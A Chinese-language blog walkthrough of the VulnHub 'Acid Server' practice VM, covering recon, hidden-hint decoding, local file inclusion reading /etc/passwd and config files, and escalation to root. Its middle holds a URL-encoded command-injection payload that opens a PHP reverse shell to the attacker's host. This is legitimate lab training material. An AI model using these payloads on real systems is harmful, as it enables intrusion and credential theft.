<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  
  <title>acid server靶机渗透 | </title>

  
  <meta name="author" content="damn1t">
  

  
  <meta name="description" content="acid server靶机渗透虚拟机地址：https://download.vulnhub.com/acid/Acid.rar
信息搜集开启acid，不用登陆，已启用服务
靶机描述：

The named of the Virtual machine is “Acid Server”. This V">
  

  
  
  <meta name="keywords" content="靶机">
  

  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">

  <meta property="og:title" content="acid server靶机渗透"/>

  <meta property="og:site_name" content=""/>

  
  <meta property="og:image" content="/favicon.ico"/>
  

  <link href="/favicon.ico" rel="icon">
  <link rel="alternate" href="/atom.xml" title="" type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
</head>


<body>
<div class="blog">
  <div class="content">

    <header>
  <div class="site-branding">
    <h1 class="site-title">
      <a href="/"></a>
    </h1>
    <p class="site-description"></p>
  </div>
  <nav class="site-navigation">
    <ul>
      
        <li><a href="/">Home</a></li>
      
        <li><a href="/archives">Archives</a></li>
      
    </ul>
  </nav>
</header>

    <main class="site-main posts-loop">
    <article>

  
    
    <h3 class="article-title"><span>acid server靶机渗透</span></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/04/17/靶机/acid/" rel="bookmark">
        <time class="entry-date published" datetime="2019-04-17T10:49:14.470Z">
          2019-04-17
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h1 id="acid-server靶机渗透"><a href="#acid-server靶机渗透" class="headerlink" title="acid server靶机渗透"></a>acid server靶机渗透</h1><p>虚拟机地址：<a href="https://download.vulnhub.com/acid/Acid.rar" target="_blank" rel="noopener">https://download.vulnhub.com/acid/Acid.rar</a></p>
<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>开启acid，不用登陆，已启用服务</p>
<p>靶机描述：</p>
<blockquote>
<p>The named of the Virtual machine is “Acid Server”. This Virtual Machine is completely web based. I have added little new concept here and hope people will enjoy solving this.You need to extract the rar and run the vmx using VMplayer . The machine has DHCP active list so once automatically assign an IP network, the next step will be to identify the target and discover the / the service / s to start the game.</p>
</blockquote>
<ul>
<li>先使用nmap扫描内网存活主机：<code>nmap -sP 192.168.199.0/24</code>,找到靶机地址：<strong>192.168.199.186</strong></li>
<li>然后就是端口扫描：<code>nmap -sS -sV -p1-65535 192.168.199.186</code>，扫出一个端口：<blockquote>
<p>PORT      STATE SERVICE VERSION<br>33447/tcp open  http    Apache httpd 2.4.10 ((Ubuntu))<br>MAC Address: 00:0C:29:28:EB:0D (VMware)</p>
</blockquote>
</li>
</ul>
<ul>
<li><a href="https://nmap.org/man/zh/man-port-scanning-techniques.html" target="_blank" rel="noopener">nmap使用</a></li>
</ul>
<ul>
<li>在地址栏输入：<code>192.168.199.186：33447</code>，看到一个页面</li>
</ul>
<p><img src="https://i.imgur.com/Q1HgsPl.png" alt=""> </p>
<p>纯静态，于是查看源码，在最底部发现<code>&lt;!--0x643239334c6d70775a773d3d--&gt;</code>，将hex转ascii，得到<code>d293LmpwZw==</code>，再base64解码，得到<strong>wow.jpg</strong>，于是访问<code>/images/wow.jpg</code>，将图片下载下来，winhex查看，在最底部发现一串hex，再次解码得到一个md5，将其解密：63425</p>
<ul>
<li><p>先以为<strong>63425</strong>为acid的root密码，结果发现是我太天真了，后来参考别人的writeup，发现了又一个目录扫描工具：<a href="https://sourceforge.net/projects/dirbuster/" target="_blank" rel="noopener">dirbuster</a></p>
</li>
<li><p>扫描目录，发现了<strong>Challenge</strong>目录，输入得到一个登录页面：</p>
</li>
</ul>
<p><img src="https://i.imgur.com/fZ3qzuQ.png" alt=""></p>
<ul>
<li><p>找寻其他线索，根据得到的文件<br><img src="https://i.imgur.com/Rbugaap.png" alt=""></p>
</li>
<li><p>最终在<strong>hacked.php</strong>中得到如下页面<br><img src="https://i.imgur.com/Y5usvFS.png" alt=""></p>
</li>
<li><p>在<strong>/Challenge/include.php</strong>中得到如下页面<br><img src="https://i.imgur.com/kn0kdi2.png" alt=""></p>
</li>
</ul>
<p>发现<code>include.php?file=//etc/passwd</code>可以进行任意文件读取：<br><img src="https://i.imgur.com/Ls58fum.png" alt=""></p>
<ul>
<li>利用<code>php://filter/read=convert.base64-encode/resource=xxx.php</code>读文件，读到<strong>psl-config.php</strong>中有如下代码：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">define(&quot;HOST&quot;, &quot;localhost&quot;); 			// The host you want to connect to. </span><br><span class="line">define(&quot;USER&quot;, &quot;root&quot;); 			// The database username. </span><br><span class="line">define(&quot;PASSWORD&quot;, &quot;mehak&quot;); 	// The database password. </span><br><span class="line">define(&quot;DATABASE&quot;, &quot;secure_login&quot;);             // The database name.</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * Who can register and what the default role will be</span><br><span class="line"> * Values for who can register under a standard setup can be:</span><br><span class="line"> *      any  == anybody can register (default)</span><br><span class="line"> *      admin == members must be registered by an administrator</span><br><span class="line"> *      root  == only the root user can register members</span><br><span class="line"> * </span><br><span class="line"> * Values for default role can be any valid role, but it&apos;s hard to see why</span><br><span class="line"> * the default &apos;member&apos; value should be changed under the standard setup.</span><br><span class="line"> * However, additional roles can be added and so there&apos;s nothing stopping</span><br><span class="line"> * anyone from defining a different default.</span><br><span class="line"> */</span><br><span class="line">define(&quot;CAN_REGISTER&quot;, &quot;any&quot;);</span><br><span class="line">define(&quot;DEFAULT_ROLE&quot;, &quot;member&quot;);</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * Is this a secure connection?  The default is FALSE, but the use of an</span><br><span class="line"> * HTTPS connection for logging in is recommended.</span><br><span class="line"> * </span><br><span class="line"> * If you are using an HTTPS connection, change this to TRUE</span><br><span class="line"> */</span><br><span class="line">define(&quot;SECURE&quot;, FALSE);    // For development purposes only!!!!</span><br></pre></td></tr></table></figure>
<ul>
<li>但是啊，没有mysql的地址</li>
</ul>
<p>尝试查看配置文件和环境变量，但依然无果，没想到啊，我真的服了，看到cake.php页面突然发现了猫腻<br><img src="https://i.imgur.com/omqkETQ.png" alt=""></p>
<p>于是尝试/Magic_Box目录，再次爆破，又发现了：</p>
<blockquote>
<p>command.php<br>low.php</p>
</blockquote>
<p>进入<code>http://192.168.199.186:33447/Challenge/Magic_Box/command.php</code>，如下页面：<br><img src="https://i.imgur.com/f2GO1Ry.png" alt=""></p>
<p>向指定地址发送IP数据包，于是想到反弹shell<br>利用<strong>include.php</strong>查看<strong>command.php</strong>源码:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include_once &apos;../includes/db_connect.php&apos;;</span><br><span class="line">include_once &apos;../includes/functions.php&apos;;</span><br><span class="line">if( isset( $_POST[ &apos;submit&apos; ] ) ) &#123;</span><br><span class="line">$target = $_REQUEST[ &apos;IP&apos; ];</span><br><span class="line"></span><br><span class="line">if (stristr(php_uname(&apos;s&apos;), &apos;Windows NT&apos;)) &#123; </span><br><span class="line">$cmd = shell_exec( &apos;ping  &apos; . $target );</span><br><span class="line">$html .= &apos;&lt;pre&gt;&apos;.$cmd.&apos;&lt;/pre&gt;&apos;;</span><br><span class="line">&#125; else &#123; </span><br><span class="line">$cmd = shell_exec( &apos;ping  -c 3 &apos; . $target );</span><br><span class="line">$html .= &apos;&lt;pre&gt;&apos;.$cmd.&apos;&lt;/pre&gt;&apos;;</span><br><span class="line">echo &quot;$cmd&lt;/br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;head&gt;</span><br><span class="line">		&lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">		&lt;link rel=&quot;stylesheet&quot; href=&quot;../css/style.css&quot;&gt;</span><br><span class="line">		&lt;link rel=&quot;stylesheet&quot; href=&quot;../styles/main.css&quot; /&gt;</span><br><span class="line">		&lt;title&gt;Reverse Kunfu&lt;/title&gt;</span><br><span class="line">	&lt;/head&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">		&lt;div class=&quot;wrapper&quot;&gt;</span><br><span class="line">                	&lt;div class=&quot;container&quot;&gt;</span><br><span class="line">			        &lt;p&gt; &lt;h1&gt;You are 1337 Hax0r. Keep your patiene and proceed further.&lt;/h1&gt; &lt;br&gt; </span><br><span class="line">				&lt;form method=&quot;post&quot; action=&quot;&lt;?php $_PHP_SELF ?&gt;&quot;&gt;</span><br><span class="line">				Enter the Host to Ping:&lt;input name=&quot;IP&quot; placeholder=&quot;IP ADDRESS&quot; type=&quot;text&quot; id=&quot;IP&quot; maxlength=&quot;200&quot;&gt;</span><br><span class="line">				&lt;input name=&quot;submit&quot; type=&quot;submit&quot; id=&quot;submit&quot; value=&quot;submit&quot;&gt;</span><br><span class="line">				&lt;/body&gt;</span><br><span class="line">				&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>有两个函数要注意：<br><strong>stristr()</strong></p>
<blockquote>
<p>stristr() 函数搜索字符串在另一字符串中的第一次出现</p>
</blockquote>
<p><strong>php_uname</strong></p>
<blockquote>
<ol>
<li><p>说明<br>　　php_uname — 返回运行 PHP 的系统的有关信息。<br>　　原型：string php_uname ([ string $mode = “a” ] )。返回运行php的操作系统的相关描述，和 phpinfo() 最顶端上输出的是同一个字符串。 如果仅仅要获取操作系统的名称。可以考虑使用常量 PHP_OS，不过要注意该常量会包含 PHP 构建（built）时的操作系统名。</p>
</li>
<li><p>参数<br>　　mode 是单个字符，用于定义要返回什么信息：</p>
</li>
</ol>
<p>‘a’：此为默认。包含序列 “s n r v m” 里的所有模式。<br>’s’：操作系统名称。例如： FreeBSD。<br>‘n’：主机名。例如： localhost.example.com。<br>‘r’：版本名称，例如： 5.1.2-RELEASE。<br>‘v’：版本信息。操作系统之间有很大的不同。<br>‘m’：机器类型。例如：i386。</p>
</blockquote>
<p>伪造useragent为windows nt<br>再输入如下参数：<code>192.168.199.138%3b%70%68%70%20%2d%72%20%27%24%73%6f%63%6b%3d%66%73%6f%63%6b%6f%70%65%6e%28%22%31%39%32%2e%31%36%38%2e%31%39%39%2e%32%33%38%22%2c%38%38%38%38%29%3b%65%78%65%63%28%22%2f%62%69%6e%2f%73%68%20%2d%69%20%3c%26%33%20%3e%26%33%20%32%3e%26%33%22%29%3b%27%0a</code>，得到shell，下一步则是提权</p>
<ul>
<li><p>查看内核<code>uname -a</code></p>
<blockquote>
<p>Linux acid 3.19.0-15-generic #15-Ubuntu SMP Thu Apr 16 23:32:01 UTC 2015 i686 i686 i686 GNU/Linux</p>
</blockquote>
</li>
<li><p>查看发行版本<code>cat /etc/issue</code>,没东西</p>
</li>
<li><p>查看详细信息<code>cat /etc/*-release</code></p>
<blockquote>
<p>DISTRIB_ID=Ubuntu<br>DISTRIB_RELEASE=15.04<br>DISTRIB_CODENAME=vivid<br>DISTRIB_DESCRIPTION=”Ubuntu 15.04”<br>NAME=”Ubuntu”<br>VERSION=”15.04 (Vivid Vervet)”<br>ID=ubuntu<br>ID_LIKE=debian<br>PRETTY_NAME=”Ubuntu 15.04”<br>VERSION_ID=”15.04”<br>HOME_URL=”<a href="http://www.ubuntu.com/" target="_blank" rel="noopener">http://www.ubuntu.com/</a>“<br>SUPPORT_URL=”<a href="http://help.ubuntu.com/" target="_blank" rel="noopener">http://help.ubuntu.com/</a>“<br>BUG_REPORT_URL=”<a href="http://bugs.launchpad.net/ubuntu/" target="_blank" rel="noopener">http://bugs.launchpad.net/ubuntu/</a>“</p>
</blockquote>
</li>
</ul>
<p>无法使用<code>vim</code>、<code>nano</code>，<code>ll</code>无法使用但可用<code>ls -ll</code>代替，<code>searchsploit linux 3.9 ubuntu priv esc</code>也没找到exp</p>
<p>于是就可以利用su提权</p>
<blockquote>
<p>1、su命令</p>
<p>su命令用来切换用户，substitute英文含义“代替”的意思</p>
<p>①su：不加用户名默认是切换为root用户，切当前目录不改变，其他环境变量不变</p>
<p>②su - 或者su -l 或者 su –login：切换为root用户，同时变更工作目录，以及SHELL,USER，PATH，HOME,LOGNAME变量</p>
<p>③su username ：切换为其他用户，目录不改变，SHELL,USER，PATH，HOME,LOGNAME变量改变</p>
<p>④su  -, -l, –login username：切换到其他用户，变更工作目录，以及SHELL,USER，PATH，HOME,LOGNAME变量</p>
<p>​⑤其他参数：</p>
<p>2、sudo命令</p>
<p>sudo命令：sudo为superuser do 的简写，即使用超级用户来执行命令，一般是指root用户</p>
<p>sudoers文件存放在etc目录下，我们可以直接输入命令visudo编辑sudoers文件，使用visudo命令编辑文件，会验证我们添加的信息是否有语法错误</p>
</blockquote>
<p><code>su</code>和<code>su -</code></p>
<blockquote>
<p>su命令和su -命令最大的本质区别就是：前者只是切换了root身份，但Shell环境仍然是普通用户的Shell；而后者连用户和Shell环境一起切换成root身份了 </p>
</blockquote>
<p>但无法使用su命令，于是可以新建一个会话，指令如下（这里有一点坑了很久，必须先su提权，否则在后面的ssh就会失败）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;import pty; pty.spawn(&apos;/bin/bash&apos;)&quot; &gt; /tmp/asdf.py</span><br><span class="line"></span><br><span class="line">python /tmp/asdf.py</span><br></pre></td></tr></table></figure></p>
<ul>
<li><code>cat /etc/passwd</code>查看有哪些用户</li>
<li><code>find \ -user acid 2&gt;/dev/null</code>找文件试图找出线索，发现了<strong>/sbin/raw_vs_isi/hint.pcapng</strong></li>
</ul>
<p>利用scp进行文件传输：<code>scp -P22 /sbin/raw_vs_isi/hint.pcapng root@192.168.199.238:/root/</code><br><a href="https://www.cnblogs.com/jasonHome/p/6033784.html" target="_blank" rel="noopener">Linux的几种文件传输命令</a><br>然后再在kali上用wireshark查看，分析tcp包，找到一个用户和密码：<strong>saman;1337hax0r</strong></p>
<ul>
<li>sudo saman成功登录</li>
<li>sudo root，密码相同，然后在<strong>/root/flag.txt</strong></li>
</ul>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/靶机/">靶机</a>
    </span>
    

    </div>

    
  </div>
</article>


    </main>

    <footer class="site-footer">
  <p class="site-info">
    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
    </br>
    
    &copy; 2019 damn1t
    
  </p>
</footer>
    
  </div>
</div>
</body>
</html>